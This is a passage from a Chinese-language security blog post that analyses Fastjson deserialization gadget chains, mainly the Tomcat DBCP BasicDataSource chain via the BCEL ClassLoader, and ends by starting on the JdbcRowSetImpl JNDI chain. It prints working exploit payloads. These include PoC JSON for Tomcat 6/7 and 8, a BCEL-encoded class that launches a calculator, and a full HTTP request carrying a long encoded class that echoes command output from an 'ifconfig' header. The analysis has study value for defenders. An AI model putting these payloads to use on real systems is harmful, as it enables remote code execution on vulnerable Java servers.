<h5 id="2-3-3-3-触发invoke"><a href="#2-3-3-3-触发invoke" class="headerlink" title="2.3.3.3 触发invoke"></a>2.3.3.3 触发invoke</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666858777493-0914c5a0-a3e8-4aee-865c-a0b4035c828b.png#averageHue=%23f9f8f7&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1377&id=u16068f40&margin=%5Bobject%20Object%5D&name=image.png&originHeight=3350&originWidth=2292&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1061777&status=done&style=none&taskId=ue8c4e6f5-b407-4916-affa-04d87473e0b&title=&width=942" alt="image.png"><br>这里看到<code>getObjectWriter</code>，就和<strong>2.3.2.2 <strong>类似了；进入<code>preWriter.writer</code>方法，跟踪到<code>propertyValue = fieldSerializer.getPropertyValueDirect(object);</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666859226689-5c2a909a-8503-4585-9e92-9f56efd0a50a.png#averageHue=%23f7f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1402&id=ud0349218&margin=%5Bobject%20Object%5D&name=image.png&originHeight=3796&originWidth=2180&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1672071&status=done&style=none&taskId=ub2cb3daf-2c5f-4574-b991-f4d34811cf4&title=&width=805" alt="image.png"><br>和</strong>2.3.2.3</strong>一样的触发invoke执行代码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666859330378-13c1234d-bb99-4e5e-b6fe-4be4031e6a2b.png#averageHue=%23f9f3f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=391&id=u62f8b730&margin=%5Bobject%20Object%5D&name=image.png&originHeight=998&originWidth=2022&originalType=binary&ratio=1&rotation=0&showTitle=false&size=240448&status=done&style=none&taskId=u19067f1a-a80e-4d9d-af81-310e5240f26&title=&width=792" alt="image.png"></p>
<h5 id="2-3-3-4-poc构造"><a href="#2-3-3-4-poc构造" class="headerlink" title="2.3.3.4 poc构造"></a>2.3.3.4 poc构造</h5><p>poc如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">  &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">  &quot;x&quot;:&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">    &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">  &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而实际上在最开始的<code>parse()</code>方法中，进入parseObject之前，传入的object就是JSONObject类，因此不需要带上 <code>&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666860260058-5c4239a4-dab4-42a0-8d65-d76ad6b55569.png#averageHue=%23f7f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=571&id=u7287cd99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1566&originWidth=1814&originalType=binary&ratio=1&rotation=0&showTitle=false&size=410130&status=done&style=none&taskId=u749495a5-39b2-44f7-b22c-60353a4a05c&title=&width=662" alt="image.png"></p>
<p>这样便带来一个疑问，<code>@type</code>字段的解析和不带<code>@type</code>的解析有什么区别<br>如图，传入的object类型是个Map类型，查看一下<code>JSONObject</code>类，确实implements <code>Map</code>接口<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666860518018-668d46c3-1138-4f29-8af1-716dda405b42.png#averageHue=%23f6f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=1083&id=u40317ccb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2948&originWidth=1758&originalType=binary&ratio=1&rotation=0&showTitle=false&size=859645&status=done&style=none&taskId=u11da7593-9762-434b-81c1-b7149920449&title=&width=646" alt="image.png"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">## tomcat6、7</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,</span><br><span class="line">      &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## &gt; tomcat8</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">      &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;driverClassName&quot;: &quot;BCELPayload&quot;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;= tomcat7.x--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- tomcat6.x的依赖包路径：org.apache.tomcat dbcp 版本号--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.100<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&gt;= tomcat8.x--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-3-4-回显和内存马EXP"><a href="#2-3-4-回显和内存马EXP" class="headerlink" title="2.3.4 回显和内存马EXP"></a>2.3.4 回显和内存马EXP</h4><p>首先可以确定的是，能用这个利用链肯定有tomcat的dbcp包，所以构造一下tomcat的回显和内存马即可</p>
<h5 id="2-3-4-1-恶意代码块位置"><a href="#2-3-4-1-恶意代码块位置" class="headerlink" title="2.3.4.1 恶意代码块位置"></a>2.3.4.1 恶意代码块位置</h5><p>之前在构造shiro反序列化的时候，会将代码都放到默认构造方法中，因为最终会生成实例化对象，但是这里只是<code>Class.forName(String name)</code>，查看这个方法，实际上默认执行Class.forName(String name) 相当于</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(String name, <span class="keyword">true</span>, ClassLoader.getClassLoader(Reflection.getCallerClass()))</span><br></pre></td></tr></table></figure>
<p>因此会执行<code>static</code>中的代码块<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666861809768-51988120-e348-4d11-8e57-91d3df6e74f8.png#averageHue=%23fbf9f8&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=571&id=ub8e5b026&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1574&originWidth=1550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=342701&status=done&style=none&taskId=uf319ddac-3fe0-4ca3-b856-6858d35c1fe&title=&width=562" alt="image.png"><br>使用案例测试一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666862170074-f23c5bad-6348-46a9-b981-71490ef8dc7e.png#averageHue=%23f9f9f9&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=401&id=u392f4915&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1184&originWidth=1258&originalType=binary&ratio=1&rotation=0&showTitle=false&size=172793&status=done&style=none&taskId=u0e7da16f-019c-4911-b922-4d5686a17ea&title=&width=426" alt="image.png"></p>
<h5 id="2-3-4-2-弹出计算器"><a href="#2-3-4-2-弹出计算器" class="headerlink" title="2.3.4.2 弹出计算器"></a>2.3.4.2 弹出计算器</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,                </span><br><span class="line">            	<span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>               </span><br><span class="line">                        &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$90$cdJ$c3$40$U$85$cfm$da$s$c6$d6$feh$fd$5b$v$I$a6$$$9a$85$cb$W$a1$U$5c$v$8a$R$5dO$c7$a1LM$93$90LE$9f$c8u7$w$$$7c$A$lJ$bc$J$F$L$O3s$b8$973$df$e1$ce$f7$cf$e7$X$80S$ec$Thh$83$I$cd$a9x$S$7e$u$a2$89$7f5$9e$wilX$E7$88$e7$a9T$e7$3aT$84$ea$b0$97$9b$I$ce$40$86$3a$d2$e6$8c$60y$dd$3bBy$U$3f$b0$a1$f5$c7$b8$99GF$cf$94$N$97$n$Te$965$a1$e3u$_$fe$d9$fa5$d4Pw$b1$8e$N$82$X$t$w$3a$f0$83$97$cc$a8$99$3fL$92PKat$ie$feH$84r$k$K$T$a7$3d$91$q$O$9a$i$ad$9e$95$q$i$7b$x$d4$c0$a4$3a$9a$f4W$83$ae$d3X$aa$y$e3$a066$f3$a0$zB$3d0B$3e$5e$8a$e4V$8c$8b$f9$G$c5P5$ec$c0qQ$c6$$$OQb$cdW$J$Ol$3e$845$ae$8e$60q$Hh$bc$f2$t$5d$7c$a0$d1n$bd$a1s$bf$e0$Wa$9bo$L$c4$3b$H$z_$b4X$89$b5r$f2$8e$bdE$81$qT$Kp$f5$X$Rg$_$92$8e$B$A$A&quot;</span>        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666863899326-e3799c34-1997-46f7-9834-bea5084c3f5e.png#averageHue=%23ecebe9&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=612&id=uf523758f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1224&originWidth=2774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=803603&status=done&style=none&taskId=uacafbb70-2621-4372-8641-476818b1d19&title=&width=1387" alt="image.png"></p>
<h5 id="2-3-4-3-回显"><a href="#2-3-4-3-回显" class="headerlink" title="2.3.4.3 回显"></a>2.3.4.3 回显</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/SecForJSP/Sec06/fastjson</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8091</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Token</span><span class="punctuation">: </span>ifconfig</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5945</span><br><span class="line"></span><br><span class="line">&#123;&#123;</span><br><span class="line">        &quot;x&quot;:&#123;</span><br><span class="line">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                </span><br><span class="line">								&quot;driverClassLoader&quot;: &#123;</span><br><span class="line">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                </span><br><span class="line">								&#125;,</span><br><span class="line">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dW$L$7c$Tw$j$ff$fe$ef$92$dc$r$bd6m$a0$c0$c1$c6k$z$b4$40$h$40$c6F$K$MZ$60$U$K$DZ$c1$AS$af$d7ks$90$de$95$cb$85$c7$98o$94$cd$b7$d39$87$ba$v$3e$aa$d3$89$cc$99$f2$Q$c6$9c07q$be$a6$d3Mq8$ls$f3$81s$3a$G$8c$fa$fb$df$b5$r$z$d90$9f$e4$ff$f8$bd$dfwy$fc$e2$a1$a3$Af$e2$7c$Ec$f1$ce$I$de$85w$f3$e5$3d$fc$fa$5e$Zv$EW$e1$7d$R$ec$c2$fb$f9$f2$B$J$5d$i$bd$5b$c6m$RL$c0$ed2$3e$u$e3C2$3e$y$e1$p2$3e$w$e3c$S$3e$cey$3e$n$e3$O$Z$86$84O$Wa$q$3e$c5$97$3bel$94$f1i$Jwq$82$cfH$b8$3b$82$3d$f8$ac$8c$cfI$f8$bc$8c$7b$b8$c0$7be$7c$n$8cI$f8$a2$84$bd$R$da$bf$q$e3$cb$R$7c$F_$e5$c8n$Z_$93$f1u$Z$f7$c9$f8$86$8coJ$b8_$c2$b7$o$98$81$7d$7c$f9v$E$fb$f1$40$E$d3$f1$j$Z$P$f2$fd$bb$7c$c9q$d6$k$Z$H$b8$d6$832$OIH$f2$e3a$Z$df$93pD$c6Q$7e$7bH$c61$J$P$H$e1$7d$8a$Op$_$bf$_$e1$R$86$d0$5c$d32$dd$f9$MbU$f5Z$86$40$83$ddf0D$9bL$cbX$99$edl5$9c$W$ad5M$90X$93$adk$e9$b5$9ac$f2$7b$l0$e0$a6$cc$MCyS$sk$c5$3b$cd$8c$k_$96$b1$adU$9a$931$W$d71$c8s$f5t$9ftF$d4$e3$9b6i$5b$b5xZ$b3$3a$e2$x$ed$e6$ac$9eZb$g$e9$b6$c5$dbu$a3$cb5m$8b8D$3dM$f2$ca$f2$I$h$d2Z$sC$98$J$971$af0$dc$94$3d$88$3b$a0w$b6$R$fb$b0$Ny$b4$cd$aecZ$j$84$M9F$s$9bv$Z$84$N$f5$M$e1$$$c7$d6$8dL$c6v$b8k$97$c8oj$ddd$e8$$$b7$c41$b6$90Db$ea$o$eb7$d1$af$91$7e$ee$60$ea$96$94chm$9c$3a$e3$O$R4$a0W$b4$5b$89$3b2$a0$8f$M$y$f5$e9$b2$ae$99$8e7$99$Z$ae$ae$3c$8f5$df$rf$92$R$edi$ad$83$8e$eb$Z$82$j$8e$9d$r$83F$5ef$c4$8d$i$c1$Z$da$Z$d4$3c$acc$b4$a7$c9$a3$b8$Xj$c2K$aeG$3e4L$D$9e$U7$bb$9a$bey$85$d6$e5$a5X$c2$P$q$i$97p$82j$98$w$9a$aa$9fJ$5e$c2$3a$aa$y$w$tr$ab$d9$ce$3a$ba$b1$c4$e4$d5$Q$bd$94$fcZ$$YA$p$96$R$af$82G$f1C$F$8f$e1q$F$3f$c2I$F$3f$c6$T$qU$c1O$f0S$F$3f$c3$cf$V$fc$CO$92$9f$c6vCW$f0K$fc$8a$ce$v$d7$r$3f$8b$ea$d3$b6$bey$95$9dN$h$U$df$90$ab9$j$G$cf$c1$r$c3$d7d$z$cb$_$c6$Q$_$c6$8a$e9$e4bJ$b3$da$3c$86$b1o$5cp$K$9e$c2Ib$ecH$db$adZ$9a$a1dpZ$U$fc$g$bf$e1$G$3eM$86$90$de5T$L$b6$95$e1$9e$O$a9O$F$cf$e0$b7$94$d7$a1u$q$e1w$KN$e1$f7To$c4$bf$94$o$cc$ad$w$jZ$r$94$d7$W$7b$b3A$f6$3c$8b$d3D$9b1$5c$ca$82$9b$r$b9$7f$40$L$f5$c3$r$86F$cb5$3a$M$87$87$f69$f2$d4$ce$d4ZZ$t$a5$e9$8f$K$fe$84$3f$x$f8$L$Pdh$9bi$b5$d9$db$IO$NQKQ$a5$a2$8f$ebt$8d$b7$9aV$3c$93$a2k$8d$de$_$d6s$b7Y$d7$y$8b$db6$ea$92$aaU$7e$c5$d6g$cdt$9b$af$f1y$F$7f$c5$L$S$5eT$f07$fc$9dC$feA$a26$$T$f0O$9cQ$f0$_$3c$a9$e0$r$fc$9bJ$8bK$a9$b5L$bb$b6$7e$87k$d4g$db$db$b9$80$97$f1$lJ$ec6G$ebR$f0_$k$_$a9$cd$5e$e7$98$$$997$ee$K$cd$cdPa$3b$j$b5Z$97$a6$a7$8cZ$d7$ee$d45$b7$96$5b$5e$db$9am$f7$944$a4$b2$d6f$F$af$e0$y$cd$j$K$m$87e$fa$y$Z$d2V$K$5e$c59B$V$YZ$d4$88$F$h$8b$3a$eeuZjP$3a$7d$Oj$o$3d$eb8$86$e5$f6$df$87WU$X$ea$b5$S$w$8aAJ$d4$Ct$fd$8d$z$T$b1Wld$f9$m$b2$fe$JYJ$E$8b$M$3d$ad9F$5b$9fi5U$97O$a4$ea7$Y$O$c5$U$b8$85$3a$cf$ba$e9$cf$f7$aa$f5$fc$a1$mzM7$a9$ea$f29Y$5dhtJD$be$92$aar$a8$df$D$pQ$d6m$cb$d5L$8b$5c$Z$93$_$b4$n$a59$cd$c6$96$aca$e9F$5d5$8d$bbb$92$d4$9c$ed2$i$ddw$3c$901o1$bcG$V$N$e3$f2$aa$c6$82$eay$ab$f9$e5$c3$b0$a0$40$A6$5c$W$bbB$n$f1$r$d4$N$ea$88$c18$ea3$d3$daJ$7d$cb0$a7$40h6$fc$bf$d123$8b$3b$bb$dc$j$9e$5b$e4s$a0$r$b9j1$P$7d$p$P$7d$fe$ac$d8$91q$8dN$7f$UQoRT8$d3$a4$x$a4x$m$e8E$ae$dddo3$9c$G$8dO$b0$RU$F$k$92$5ca0CC$d6$e5$d1$cd$97$d27$L$ea$G$cd$a2$3e$a0_$c7$8dVW$96$a6$WU$y$998$b2$9f$d9$b4$e3y$I$k$cd$aa$82$I$aeY$c9f$8cEF$da$ec$a4$89$40$93h$f2$eb$3b$96$3f$b2$f8c$df2$b6$bb$7e$83$f4u$7d$a0$aa$9a$3f$e4$a5v$db$f1$L$b1$f2$KQ$ea$ef$a1$b2$bc$k$ea$cfr$91elk$b4$u$yT$95CKz$m$8b$c1L$da0$ba$b8$e6e$d5k$e9$8dl$v$bd$60$f2$8f$A$c6$9f$82$b4$$$a7$5b$9cvF$7bpJ$P$d8$7e$P$ddDk$c8$D$KXA$ab$e2$T$60$rn$a2$5d$c6$aa$7e$e6$90J$b72$40$i$$$d6$j$80$90$83$d845$87$40$y$98Ch$c5$b4$40$O$d24$ba$cb$c7$Q$a6$efJqv$a0$3cPst$af$f0tMy$60f$o$a8$G$lE$a8$5b8$a1$Sy$q$RRC$b1$a2$i$94$3d$YI$a7b$3a$dd$8db$3a$95x$t$a2$bb$87$d3$Fb$d1K$b29$40NH$aa$f40J$f7p$92$9d$aa$c4I$ca$f2H$a4$3e$S$O$8fqx7F$qd$ef$9e$c3p$fa$fa$d0$cb$a99$aa$dcg$u$edc$f0$ef$F$E$8f$Y$C$3f$86$91$f4M$c8$e2$ecpyX$95$Pb$U$c3$5e$f6$84$w$97$87$PB$V$90$88$a8$R$ce7$3a$8f$_$c2$e5$V$a9E$i$3eF$3c$82$abr$b8Z$z$a2$c3$d8$i$c6$r$U$l1$3e$40$88$a48$M$T$9a$3d4$5d$c7$s$c5$d8D$ba$8d$3b$86$J$3c$88$tXR$N$e5p$cd$k$b6ZU8O$85$cf$f3$A$w$3d$k$c5$e79$8cI$c92$3c$d6$83$c9$9cw$5d$ac$ea$A$aas$98$S$9b$ea$85$5b$N$j$c1$E$S$3c$ad9$Z$88$d54$t$83j$a8$99$C$d7$H$ad$e5$d0$b8$PM$U$l$c6$f4$e4a$ccH$aa$c5$3d$98$99$c3$9br$98$d5$83kc$b3s$b8$$$87$ebs$98$93$u$89$r$O$a0$$$RU$a3$b1$b9$fd$O$cc$p$b5$f3$d5$a8o$8cZ$c2$8d$a0hz$G$df$e0$d3$a8$d1$7c$7bU$c9$b3$b3$h$3b$S$d1$d8B$$$aeT$z$cd$a1$9e$98Jc$N$a1$B$a9$c9$Aw4$Z$f4$dd$9d$afJ$a1$7e$N$c9$A$f7Y$e4$k$t$83$fc$a8$96$i$edw$7f$b0$e2$d2$C$8a$Du$a3y$V$o$bc$x$cc$ba$_N$f3$_e$dd$94$b3$607$c4$5d$B$d6$fdZe7J$96$P$c7$e2$D$b8$b1$h$81$a6$fd$I$e3$5e$dc$87$fb1$8c$de$$$9f$a1w$aea$c2X$n$rl$c6$C$d4b$8ep$O$8b0$X$9a$b7$b7a$97$b7$ef$W$5e$f6v$88AQ$c6$o1$yF$c5$Y$ddE$de$93$y$82z$af$P$F$ea$ce0$q$92$xc$U$9d$w$Q$n$89$Kf$a1$98$q$96$a0$BQ$92X$K$9bz$d3E$M$b7$S$e5n$M$c7$j$u$c7$5d$YAV$8d$o$bb$c6$90e$w$f6a4$8e$d1$bf$b1$e3$b8$9a$ac$iGvN$qK$c7$d3$5b$df$E$bc$88kp$86$a4$9fE$r$T1$89$c9$98$ccF$a0$8aU$a2$9aM$c7$UV$87$a9l$B$a6$b1$a5$a8a$gj$d9m$88$b3$3b1$9d$j$c3$Mv$k3$85$b1$98$rT$e2Za$Jf$L$v$cc$r$cf$af$T$3aq$bd$e0$92$f7$3b$91$Q$kB$9dp$g$f3$84$e7p$83$f0$C$aa$843X$u$bc$82E$U$81z$e1$C$g$84$5eD$c4$m$96S$q$96$88a$y$V$a3XF$d1h$a4$3c7ys$e9$U$f9$b2$8f$7c$5c$8d5$U$89gQ$e4$9fHg$D$9a$d1$82$ui$ea$f4N$a5$a4$d7$r$ec$9b$R$r$cb$9e$c7Z$acC1$d9w$ioA$S$rl$3a$3b$84$f5$d8$80$I$5b$ca$f6b$p$9d$8a$98$c6n$c7$cdtR$98$ca$9e$c2$5b$f16$8a$f4$y$e1$R$bc$j$g$e5$a0Ax$Q$ad$d0$v$T$b7$92$_mD$t$b1$R$ec4$M$b4$93$F$X$uc$ab$d1At$93$85SH$Ro$A$82$u$c2$c4$s$b2$3bL$f8$cdH$d3$M$j$s$bcD$WZ$94$d1$K$8a$84$8d$$$88$e4i$c4$e3$F$b6$d0$af$H$a3z1$ZA$s$c1$91$90$91$Q$a6Y$7c$B$c3$r$b8$XP$n$nK$b2$sJ$d8J$ef$db$dbb7$d3$a2$bc$86$g$J$db$d9E$9c$q$b0$ff$5d$paG$_$89$8b$e6I$n$B$c4$ed$e1$b7$b3$BJ$o$940$P$E$b8$e5$3c$b2$af$82$9dE$e8$i$82$bd$e4$e7$60$T$ea$r$ec$M$f4$c2$fb$f7$ce$cf$bd$U$j$o$d8$e9$z$e7$I$c8$a8$ec$f8$D$e4$j$ff$D$bd$d5$$$c0$f1$Q$A$A&quot;        &#125;</span><br><span class="line">    &#125;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666865887150-1c172434-43c4-4dfd-90d8-d7fe1cedb96b.png#averageHue=%23f5f5f5&clientId=u95dfbd9d-d538-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=416&id=u12ae7457&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1168&originWidth=2716&originalType=binary&ratio=1&rotation=0&showTitle=false&size=604694&status=done&style=none&taskId=u045de62d-97f6-4f55-a27e-41c4fc9930c&title=&width=968" alt="image.png"></p>
<h5 id="2-3-4-4-内存马"><a href="#2-3-4-4-内存马" class="headerlink" title="2.3.4.4 内存马"></a>2.3.4.4 内存马</h5><p>还未构造，和<code>Tomcat</code>一样</p>
<h3 id="2-4-JdbcRowSetImpl利用链"><a href="#2-4-JdbcRowSetImpl利用链" class="headerlink" title="2.4 JdbcRowSetImpl利用链"></a>2.4 JdbcRowSetImpl利用链</h3><h4 id="2-4-1-JNDI调用"><a href="#2-4-1-JNDI调用" class="headerlink" title="2.4.1 JNDI调用"></a>2.4.1 JNDI调用</h4><p>如图<code>JdbcRowSetImpl#connect</code>中触发<code>JNDI</code>请求，<code>dataSourceName</code>是参数<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666882706442-4eb44d94-e709-4558-8e10-f923f8b16e71.png#averageHue=%23f7f4ee&clientId=u13878d85-faf4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=390&id=uc2319c10&margin=%5Bobject%20Object%5D&name=image.png&originHeight=924&originWidth=2358&originalType=binary&ratio=1&rotation=0&showTitle=false&size=252333&status=done&style=none&taskId=uc00169fd-0d02-40d2-9248-6a9010e6f23&title=&width=996" alt="image.png"></p>
<h4 id="2-4-2-触发链setAutoCommit"><a href="#2-4-2-触发链setAutoCommit" class="headerlink" title="2.4.2 触发链setAutoCommit"></a>2.4.2 触发链setAutoCommit</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666882878566-cc3bd17a-c6a2-4454-8c17-51837fc0986a.png#averageHue=%23f7f5ee&clientId=u13878d85-faf4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=337&id=u36fa8156&margin=%5Bobject%20Object%5D&name=image.png&originHeight=674&originWidth=1432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133052&status=done&style=none&taskId=ud0ac60d4-911a-4309-817f-d72274c4d0a&title=&width=716" alt="image.png"></p>
